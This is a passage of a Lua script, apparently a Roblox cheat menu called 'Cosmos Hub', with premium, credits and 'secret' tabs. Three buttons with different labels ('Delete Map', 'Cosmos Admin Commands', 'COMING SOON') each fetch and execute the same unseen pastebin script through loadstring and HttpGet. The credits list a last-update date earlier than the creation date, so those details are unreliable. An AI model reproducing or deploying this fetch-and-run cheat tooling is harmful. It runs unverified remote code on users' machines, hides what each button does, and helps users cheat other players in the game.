PremiumSection:NewButton("Delete Map", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
PremiumSection:NewButton("Cosmos Admin Commands", "Enter A Correct Key First", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
local Credits = Window:NewTab("Credits")
local CreditsSection = Credits:NewSection("Made By Tim")
local CreditsSection = Credits:NewSection("Discord Username: Cosmos#5091")
local CreditsSection = Credits:NewSection("Discord ID: 816559979959156766")
local CreditsSection = Credits:NewSection("Server: Discord.gg/QnbxmxMrJG")
local CreditsSection = Credits:NewSection("Thank you for choosing Cosmos Hub!")
local CreditsSection = Credits:NewSection("- - - - - - - - - - - - - - - - - - - - - - -")
local CreditsSection = Credits:NewSection("Theme: OG Dark")
local CreditsSection = Credits:NewSection("Creation Date: 12th Of July 2022")
local CreditsSection = Credits:NewSection("Last Update: 12th Of April 2022")
local CreditsSection = Credits:NewSection("Version: 4.1a")

local _ = Window:NewTab("_")
local _Section = _:NewSection("-SECRET SECTION-")
_Section:NewButton("COMING SOON", "test button", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
